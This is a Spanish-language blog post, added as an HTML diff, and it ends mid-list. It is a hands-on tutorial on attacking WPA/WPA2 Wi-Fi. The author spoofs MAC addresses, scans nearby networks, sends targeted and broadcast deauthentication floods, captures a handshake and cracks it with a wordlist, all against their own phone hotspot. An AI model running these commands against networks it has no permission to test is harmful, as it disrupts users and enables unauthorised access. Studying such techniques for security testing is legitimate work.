@@ -1,0 +1,1703 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hacking Wifi - WPA2 | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Hacking Wifi - WPA2" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hacking-wifi/wpa2/2024/03/20/hacking-wpa2.html" />
+<meta property="og:url" content="http://localhost:4000/hacking-wifi/wpa2/2024/03/20/hacking-wpa2.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-20T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hacking Wifi - WPA2" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-20T00:00:00-06:00","datePublished":"2024-03-20T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"Hacking Wifi - WPA2","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hacking-wifi/wpa2/2024/03/20/hacking-wpa2.html"},"url":"http://localhost:4000/hacking-wifi/wpa2/2024/03/20/hacking-wpa2.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hacking Wifi - WPA2</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-03-20T00:00:00-06:00" itemprop="datePublished">
+        Mar 20, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="/assets/wifi/hacking-wpa2/portal.png" />
+</p>
+
+<blockquote>
+  <p>Como ya sabemos necesitas una antena que acepte modo monitor en el anterior post deje el link de una antena que recomiendo al igual que muchas personas en este post nos vamos a estar enfocando en <strong>WPA/WPA2</strong>, los puntos de acceso los estaremos montando desde nuestro celular como en el post anterior simplemente indicando la contraseña y que es <strong>WPA o WPA2</strong>.</p>
+</blockquote>
+
+<h2 id="modo-monitor">Modo monitor</h2>
+
+<ul>
+  <li>Vamos a conectar nuestra antena en mi caso ya estaría recuerda que tu antena puede tener un nombre diferente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ifconfig wlx9cefd5f91ec0
+wlx9cefd5f91ec0: <span class="nv">flags</span><span class="o">=</span>4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        ether 5a:46:ba:ee:43:6e  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno ahora vamos a poner la antena en modo monitor para poder desplegar los ataques.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airmon-ng start wlx9cefd5f91ec0
+
+Found 2 processes that could cause trouble.
+Kill them using <span class="s1">'airmon-ng check kill'</span> before putting
+the card <span class="k">in </span>monitor mode, they will interfere by changing channels
+and sometimes putting the interface back <span class="k">in </span>managed mode
+
+    PID Name
+    675 NetworkManager
+    685 wpa_supplicant
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlx9cefd5f91ec0	rt2800usb	Ralink Technology, Corp. RT5572
+Interface wlx9cefd5f91ec0mon is too long <span class="k">for </span>linux so it will be renamed to the old style <span class="o">(</span>wlan#<span class="o">)</span> name.
+
+		<span class="o">(</span>mac80211 monitor mode vif enabled on <span class="o">[</span>phy0]wlan0mon
+		<span class="o">(</span>mac80211 station mode vif disabled <span class="k">for</span> <span class="o">[</span>phy0]wlx9cefd5f91ec0<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora como vemos ya esta en modo monitor.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ifconfig wlan0mon
+wlan0mon: <span class="nv">flags</span><span class="o">=</span>4098&lt;BROADCAST,MULTICAST&gt;  mtu 1500
+        unspec 9C-EF-D5-F9-1E-C0-D8-AA-00-00-00-00-00-00-00-00  txqueuelen 1000  <span class="o">(</span>UNSPEC<span class="o">)</span>
+        RX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Cuando iniciamos el modo monitor con <code class="language-plaintext highlighter-rouge">airmon-ng</code> vemos 2 procesos conflictivos que necesitamos matar por detras son los que nos permiten estar conectados a una red inalambrica y nos otorga una <strong>IP</strong> por <strong>DHCP</strong>.</p>
+  </li>
+  <li>
+    <p>Cuando estamos en modo monitor perdemos conectividad a internet a si que como son conflictivos los procesos vamos a matar estos procesos para no tener inconvenientes.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ killall dhclient wpa_supplicant
+</code></pre></div></div>
+
+<h2 id="falsificación-de-la-dirección-mac">Falsificación de la dirección MAC</h2>
+
+<ul>
+  <li>Pues bueno aunque no tengamos <strong>IP</strong> por que estamos en modo monitor seguimos teniendo la dirección <strong>MAC</strong> ala hora de desplegar los ataques pueden quedar registros que relacionen nuestro dispositivo a si que lo que podemos hacer es falsificar nuestra dirección <strong>MAC</strong> lo único es que tenemos que dar de baja la antena en modo monitor ya que no podemos cambiar la <strong>MAC</strong> mientras este activa a si que vamos a darla de baja.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ifconfig wlan0mon down
+</code></pre></div></div>
+
+<ul>
+  <li>Para cambiar la <strong>MAC</strong> vamos a usar <code class="language-plaintext highlighter-rouge">macchanger</code> aquí vemos los parámetros de la herramienta.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ macchanger <span class="nt">--help</span>
+GNU MAC Changer
+Usage: macchanger <span class="o">[</span>options] device
+
+  <span class="nt">-h</span>,  <span class="nt">--help</span>                   Print this <span class="nb">help</span>
+  <span class="nt">-V</span>,  <span class="nt">--version</span>                Print version and <span class="nb">exit</span>
+  <span class="nt">-s</span>,  <span class="nt">--show</span>                   Print the MAC address and <span class="nb">exit</span>
+  <span class="nt">-e</span>,  <span class="nt">--ending</span>                 Don<span class="s1">'t change the vendor bytes
+  -a,  --another                Set random vendor MAC of the same kind
+  -A                            Set random vendor MAC of any kind
+  -p,  --permanent              Reset to original, permanent hardware MAC
+  -r,  --random                 Set fully random MAC
+  -l,  --list[=keyword]         Print known vendors
+  -b,  --bia                    Pretend to be a burned-in-address
+  -m,  --mac=XX:XX:XX:XX:XX:XX
+       --mac XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX
+
+Report bugs to https://github.com/alobbs/macchanger/issues
+</span></code></pre></div></div>
+
+<ul>
+  <li>Como tal podemos ver que esta es nuestra actual dirección <strong>MAC</strong> en base al <strong>OUI</strong> se puede saber que es o a quien pertenece un dispositivo en este caso no me lo detecta por que no sabe.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ macchanger <span class="nt">-s</span> wlan0mon
+Current MAC:   9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+Permanent MAC: 9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Una ejemplo es este aquí vemos el <strong>OUI</strong> de <strong>Vmware</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ macchanger <span class="nt">-l</span> | <span class="nb">grep</span> <span class="nt">-i</span> vmware
+1386 - 00:05:69 - VMware, Inc.
+3086 - 00:0c:29 - VMware, Inc.
+7161 - 00:1c:14 - VMware, Inc
+10601 - 00:50:56 - VMware, Inc.
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos asignarnos una dirección <strong>MAC</strong> aleatoria o una en especifica se hace de la siguiente forma.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ macchanger <span class="nt">-a</span> wlan0mon
+Current MAC:   9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+Permanent MAC: 9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+New MAC:       00:06:47:93:d7:70 <span class="o">(</span>Etrali S.A.<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora tenemos la <strong>MAC</strong> de <strong>Etrali S.A.</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ macchanger <span class="nt">-s</span> wlan0mon
+Current MAC:   00:06:47:93:d7:70 <span class="o">(</span>Etrali S.A.<span class="o">)</span>
+Permanent MAC: 9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos asignarnos una <strong>MAC</strong> en especifica en este caso a mi me interesa asignarme esta <strong>MAC</strong> para hacerme pasar por la <strong>DEA</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ macchanger <span class="nt">-l</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"Dea Security"</span>
+5383 - 00:15:22 - Dea Security
+</code></pre></div></div>
+
+<ul>
+  <li>Para hacerlo simplemente le asignamos el <strong>OUI</strong>  y algo aleatorio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ macchanger <span class="nt">--mac</span><span class="o">=</span><span class="s2">"00:15:22:ad:bc:21"</span> wlan0mon
+Current MAC:   00:06:47:93:d7:70 <span class="o">(</span>Etrali S.A.<span class="o">)</span>
+Permanent MAC: 9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+New MAC:       00:15:22:ad:bc:21 <span class="o">(</span>Dea Security<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a dar de alta la tarjeta de red.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ifconfig wlan0mon up
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vemos que tenemos la de la <strong>Dea</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ macchanger <span class="nt">-s</span> wlan0mon
+Current MAC:   00:15:22:ad:bc:21 <span class="o">(</span>Dea Security<span class="o">)</span>
+Permanent MAC: 9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si quieres restablecer todo a como estaba por defecto es muy fácil recuerda que primeramente tenemos que darla de baja para que pueda funcionar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ifconfig wlan0mon down
+</code></pre></div></div>
+
+<ul>
+  <li>Y ahora hacemos lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ macchanger <span class="nt">-p</span> wlan0mon
+Current MAC:   00:15:22:ad:bc:21 <span class="o">(</span>Dea Security<span class="o">)</span>
+Permanent MAC: 9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+New MAC:       9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+❯ ifconfig wlan0mon up
+❯ airmon-ng stop wlan0mon
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlan0mon	rt2800usb	Ralink Technology, Corp. RT5572
+		<span class="o">(</span>mac80211 station mode vif enabled on <span class="o">[</span>phy0]wlan0<span class="o">)</span>
+		<span class="o">(</span>mac80211 monitor mode vif disabled <span class="k">for</span> <span class="o">[</span>phy0]wlan0mon<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo necesitamos reiniciar este servicio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /etc/init.d/networking restart
+Restarting networking <span class="o">(</span>via systemctl<span class="o">)</span>: networking.service.
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno después de volver a poner la tarjeta en modo monitor otra vez vemos que ahora tiene la dirección <strong>MAC</strong> original puedes cambiarla otra vez pero en mi caso no lo haré por que todos los ataques los estaremos haciendo en local y no atacando a alguna red que no nos pertenece en ese caso si no la cambiáramos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ macchanger <span class="nt">-s</span> wlan0mon
+Current MAC:   9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+Permanent MAC: 9c:ef:d5:f9:1e:c0 <span class="o">(</span>unknown<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="analizando-el-entorno">Analizando el entorno</h2>
+
+<ul>
+  <li>Ahora lo que vamos a hacer es ver las redes inalambricas que están disponibles en el entorno para hacerlo simplemente ejecutamos lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng wlan0mon
+</code></pre></div></div>
+
+<ul>
+  <li>Hay podemos ver en mi caso las redes inalambricas en mi entorno disponibles recordar que el <strong>ESSID</strong> es el nombre de la red wifi el <strong>BSSID</strong> es la dirección <strong>MAC</strong> del punto de acceso el <strong>PWR</strong> es para que tan cerca esta de nosotros entre mas cerca estemos mejor.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web1.png" />
+</p>
+
+<ul>
+  <li>Lo que hecho ahora es crearme un punto de acceso desde el celular que lo tengo alado para que vean que vamos a tener esta red muy cerca si volvemos a ejecutar <code class="language-plaintext highlighter-rouge">airodump-ng wlan0mon</code> la veremos ademas sabemos que la autenticación es <strong>PSK</strong> ya que tenemos que proporcionar una contraseña para poder conectarnos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web2.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Bueno algo a saber es la que la sección de abajo corresponde a los clientes que están conectanos a un punto de acceso.</p>
+  </li>
+  <li>
+    <p><strong>STATION</strong> es un cliente puede ser un celular un ordenador o lo que sea y el <strong>BSSID</strong> nos dice que esta asociado a ese punto de acceso vemos que el punto de acceso termina en <strong>94:E4</strong> y si nos fijamos corresponde a <strong>Totalplay-E39F</strong> que es de algún vecino quiero pensar el <strong>PWR</strong> es <strong>-1</strong> pero la red esta algo alejada de mi, los <strong>Frames</strong> entre mas valla aumentando ese significa que el cliente esta activo en la red, cuando nos dice <strong>&lt;length: 0&gt;</strong> es que la red esta oculta.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web3.png" />
+</p>
+
+<ul>
+  <li>Lo que podemos hacer es filtrar directamente por una red en especifico con el <strong>CH</strong> y el <strong>ESSID</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng <span class="nt">-c</span> 1 <span class="nt">--essid</span> MiguelWifi wlan0mon
+</code></pre></div></div>
+
+<ul>
+  <li>Hay vemos muchos clientes asociados a otros AP y 1 al nuestro.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web4.png" />
+</p>
+
+<ul>
+  <li>Si aumentan los <strong>Frames</strong> sabemos que el cliente esta activo si expulsamos a un cliente de la red estaremos haciendo un ataque de desautenticacion para cuando se reconecte de forma automática capturar el hash podemos guardar todo en una captura (cambie el canal por que cambie el punto de acceso).</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng <span class="nt">-c</span> 6 <span class="nt">-w</span> Captura <span class="nt">--essid</span> MiguelWifi wlan0mon
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos todo el trafico.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web5.png" />
+</p>
+
+<ul>
+  <li>Si paramos esto y hacemos un <code class="language-plaintext highlighter-rouge">ls</code> vemos las capturas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ll
+.rw-r--r-- root root  18 KB Wed Aug 30 12:27:14 2023  Captura-01.cap
+.rw-r--r-- root root 2.0 KB Wed Aug 30 12:27:16 2023  Captura-01.csv
+.rw-r--r-- root root 590 B  Wed Aug 30 12:27:16 2023  Captura-01.kismet.csv
+.rw-r--r-- root root  29 KB Wed Aug 30 12:27:16 2023  Captura-01.kismet.netxml
+.rw-r--r-- root root 449 KB Wed Aug 30 12:27:16 2023  Captura-01.log.csv
+</code></pre></div></div>
+
+<ul>
+  <li>La mas interesante es la <strong>.cap</strong> ya que hay es donde esta el <strong>handshake</strong> y toda la información importante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ file <span class="k">*</span>
+Captura-01.cap:           pcap capture file, microsecond ts <span class="o">(</span>little-endian<span class="o">)</span> - version 2.4 <span class="o">(</span>802.11, capture length 65535<span class="o">)</span>
+Captura-01.csv:           ASCII text, with CRLF line terminators
+Captura-01.kismet.csv:    ASCII text, with very long lines, with CRLF, LF line terminators
+Captura-01.kismet.netxml: XML 1.0 document, ASCII text
+Captura-01.log.csv:       CSV text
+</code></pre></div></div>
+
+<h2 id="ataque-para-capturar-el-handshake-deautenticación-dirigido">Ataque para capturar el Handshake (Deautenticación dirigido)</h2>
+
+<ul>
+  <li>
+    <p>Este es una de los ataques mas comunes.</p>
+  </li>
+  <li>
+    <p>Vamos a seguir monitoreando el trafico de la red que creamos.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng <span class="nt">-c</span> 6 <span class="nt">-w</span> Captura <span class="nt">--essid</span> MiguelWifi wlan0mon
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/webnew.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Este es el equipo que quiero expulsar de la red <strong>80:30:49:81:DC:AD</strong> (Estos ataques solo funcionan para <strong>(WPA/WPA2</strong>) de autenticacion <strong>PSK</strong> los de usuario y contraseña son otro tipo de ataque.</p>
+  </li>
+  <li>
+    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">aireplay-ng</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aireplay-ng <span class="nt">--help</span> | <span class="nb">tail</span> <span class="nt">-n</span> 13
+      <span class="nt">--deauth</span>      count : deauthenticate 1 or all stations <span class="o">(</span><span class="nt">-0</span><span class="o">)</span>
+      <span class="nt">--fakeauth</span>    delay : fake authentication with AP <span class="o">(</span><span class="nt">-1</span><span class="o">)</span>
+      <span class="nt">--interactive</span>       : interactive frame selection <span class="o">(</span><span class="nt">-2</span><span class="o">)</span>
+      <span class="nt">--arpreplay</span>         : standard ARP-request replay <span class="o">(</span><span class="nt">-3</span><span class="o">)</span>
+      <span class="nt">--chopchop</span>          : decrypt/chopchop WEP packet <span class="o">(</span><span class="nt">-4</span><span class="o">)</span>
+      <span class="nt">--fragment</span>          : generates valid keystream   <span class="o">(</span><span class="nt">-5</span><span class="o">)</span>
+      <span class="nt">--caffe-latte</span>       : query a client <span class="k">for </span>new IVs  <span class="o">(</span><span class="nt">-6</span><span class="o">)</span>
+      <span class="nt">--cfrag</span>             : fragments against a client  <span class="o">(</span><span class="nt">-7</span><span class="o">)</span>
+      <span class="nt">--migmode</span>           : attacks WPA migration mode  <span class="o">(</span><span class="nt">-8</span><span class="o">)</span>
+      <span class="nt">--test</span>              : tests injection and quality <span class="o">(</span><span class="nt">-9</span><span class="o">)</span>
+
+      <span class="nt">--help</span>              : Displays this usage screen
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>El <strong>-0</strong> nos permite deautenticar una estación de una red inalambrica lo vamos a expulsar para que cuando se vuelva a conectar se genere el <strong>handshake</strong> y lo podamos capturar.</p>
+  </li>
+  <li>
+    <p>Vamos a emitir 10 paquetes de deautenticacion del punto de acceso.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aireplay-ng <span class="nt">-0</span> 15 <span class="nt">-e</span> MiguelWifi <span class="nt">-c</span> 80:30:49:81:DC:AD wlan0mon
+03:21:06  Waiting <span class="k">for </span>beacon frame <span class="o">(</span>ESSID: MiguelWifi<span class="o">)</span> on channel 1
+Found BSSID <span class="s2">"C6:BF:FD:55:E2:F7"</span> to given ESSID <span class="s2">"MiguelWifi"</span><span class="nb">.</span>
+03:21:07  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span> 0|47 ACKs]
+03:21:07  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>38|72 ACKs]
+03:21:08  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>63|68 ACKs]
+03:21:08  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>61|57 ACKs]
+03:21:09  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>70|75 ACKs]
+03:21:10  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>61|64 ACKs]
+03:21:10  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>61|84 ACKs]
+03:21:11  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>61|63 ACKs]
+03:21:12  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>61|81 ACKs]
+03:21:12  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>58|79 ACKs]
+03:21:13  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>63|64 ACKs]
+03:21:14  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>42|67 ACKs]
+03:21:14  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>60|64 ACKs]
+03:21:15  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>47|72 ACKs]
+03:21:16  Sending 64 directed DeAuth <span class="o">(</span>code 7<span class="o">)</span><span class="nb">.</span> STMAC: <span class="o">[</span>80:30:49:81:DC:AD] <span class="o">[</span>31|75 ACKs]
+</code></pre></div></div>
+
+<ul>
+  <li>Esto lo que hice fue expulsar al cliente de la red y ahora ya capturamos el <strong>Handshake</strong> ya se conecte automáticamente.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web7new.png" />
+</p>
+
+<ul>
+  <li>Procedemos a crackear para ver la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aircrack-ng <span class="nt">-w</span> /usr/share/wordlists/rockyou.txt Captura-02.cap
+Reading packets, please wait...
+Opening Captura-02.cap
+Read 6933 packets.
+
+
+                               Aircrack-ng 1.6 
+
+      <span class="o">[</span>00:00:00] 115/10303727 keys tested <span class="o">(</span>576.74 k/s<span class="o">)</span> 
+
+      Time left: 4 hours, 57 minutes, 45 seconds                 0.00%
+
+      <span class="o">[</span>00:00:00] 299/10303727 keys tested <span class="o">(</span>880.17 k/s<span class="o">)</span> 
+
+      Time left: 3 hours, 15 minutes, 6 seconds                  0.00%
+
+      <span class="o">[</span>00:00:00] 451/10303727 keys tested <span class="o">(</span>915.48 k/s<span class="o">)</span> 
+
+      Time left: 3 hours, 7 minutes, 34 seconds                  0.00%
+
+      <span class="o">[</span>00:00:01] 555/10303727 keys tested <span class="o">(</span>928.10 k/s<span class="o">)</span> 
+
+      Time left: 3 hours, 5 minutes, 1 second                    0.01%
+
+                       Current passphrase: manchester                 
+
+
+      Master Key     : 55 01 AE 01 39 05 DF 0B 58 9B EF 29 56 27 80 10 
+                          KEY FOUND! <span class="o">[</span> manchester <span class="o">]</span>
+      Transient Key  : 51 23 B5 F0 A5 9A CA 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+      EAPOL HMAC     : 92 E5 79 A4 74 0A 86 69 6E C2 3E 53 7B 76 17 CC 
+</code></pre></div></div>
+
+<h2 id="ataque-de-de-autenticacion-global">Ataque de De-Autenticacion Global</h2>
+
+<ul>
+  <li>Bueno para este ataque vamos a seguir monitorisando el punto de acceso que creamos desde nuestro celular para eso seguimos los mismos conceptos, para ver los clientes conectados</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web8.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Pero lo que ahora queremos hacer es expulsar a todos los clientes de la red.</p>
+  </li>
+  <li>
+    <p>Para expulsar a todos los clientes de la red la dirección <strong>MAC</strong> del dispositivo a atacar y esa <strong>MAC</strong> es <code class="language-plaintext highlighter-rouge">FF:FF:FF:FF:FF:FF</code> esta dirección <strong>MAC</strong> es la dirección <strong>Broadcast</strong>, la cual hace referencia a todos los clientes que están en la red, al expulsar a todos tenemos mas tasa de éxito ya que la mayoría de clientes se van a volver a desconectar y cunado uno se reconecte tenemos un <strong>Handshake</strong> valido.</p>
+  </li>
+  <li>
+    <p>Antes de hacer el ataque no tenemos ningún <strong>Handshake</strong>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web9.png" />
+</p>
+
+<ul>
+  <li>Ahora si lo iniciamos los dispositivos se van a desconectar y cuando uno se reconecte capturaremos el <strong>Handshake</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aireplay-ng <span class="nt">-0</span> 15 <span class="nt">-e</span> MiguelWifi <span class="nt">-c</span> FF:FF:FF:FF:FF:FF wlan0mon
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web10new.png" />
+</p>
+
+<ul>
